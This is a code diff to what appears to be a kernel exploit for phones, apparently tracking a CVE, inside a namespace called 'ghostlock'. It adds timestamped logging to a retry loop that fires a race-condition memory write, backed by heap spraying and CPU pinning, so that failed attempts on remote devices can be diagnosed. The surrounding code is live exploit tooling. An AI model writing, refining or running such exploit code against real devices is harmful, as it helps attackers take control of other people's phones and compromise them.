@@ -61,7 +61,13 @@ namespace ghostlock::session::backend {
             const auto request = memory::WriteRequest::make(target, static_cast<memory::WriteMode>(mode), leaf != 0);
 
             for (uint32_t attempt = 1; attempt <= attempts; attempt++) {
-                pr_info("%s attempt %u/%u\n", stage, attempt, attempts);
+                /* Timestamped: the retry ladder is the only place a remote log
+                 * can show HOW LONG a stage took, not merely whether it landed.
+                 * A device that needs attempt 9 is timing-marginal; one that
+                 * lands on attempt 1 is not, and the count alone cannot tell
+                 * the two apart from a log. */
+                pr_info("[T+%.0fms] %s attempt %u/%u\n", attack::timer_ms(), stage,
+                        attempt, attempts);
 
                 /* the previous attempt's write can land after its verify read; check
                  * before paying for another heap spray */
@@ -77,7 +83,8 @@ namespace ghostlock::session::backend {
                 Status routed = Cve2026_43499Policy::template attack_write<M>(session, request, stage);
                 if (!routed) {
                     support::discard_prebuilt_page();
-                    pr_warning("%s attempt %u route failed; backing off\n", stage, attempt);
+                    pr_warning("[T+%.0fms] %s attempt %u: route failed; backing off\n",
+                               attack::timer_ms(), stage, attempt);
                     usleep(100000);
                     continue;
                 }
@@ -86,6 +93,15 @@ namespace ghostlock::session::backend {
                 }
                 if (settle_usec) usleep(settle_usec);
                 if (verify(context)) return true;
+                /* The route returned without error but the write is not there.
+                 * This used to fall through in silence, so the next line in the
+                 * log was "attempt N+1" -- indistinguishable from a route that
+                 * never ran at all. Telling those two apart is most of what
+                 * makes a log from someone else's phone readable, and the
+                 * distinction is the one that separates "the race missed its
+                 * window" from "the race never got one". */
+                pr_warning("[T+%.0fms] %s attempt %u: route returned clean but the "
+                           "write did not verify\n", attack::timer_ms(), stage, attempt);
                 usleep(50000);
             }
             /* the last write can land after its verify read */
@@ -587,6 +603,11 @@ namespace ghostlock::session::backend {
         support::init_p0_profile();
         kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
         pr_info("main thread running on cpu=%d\n", sched_getcpu());
+
+        /* Sampled with the main thread already pinned and immediately before the
+         * clock starts: this is the machine state every attempt below runs in,
+         * and on a remote device it is otherwise invisible. */
+        support::log_environment("start");
 
         attack::timer_reset();
         attack::timer_mark("exploit start");
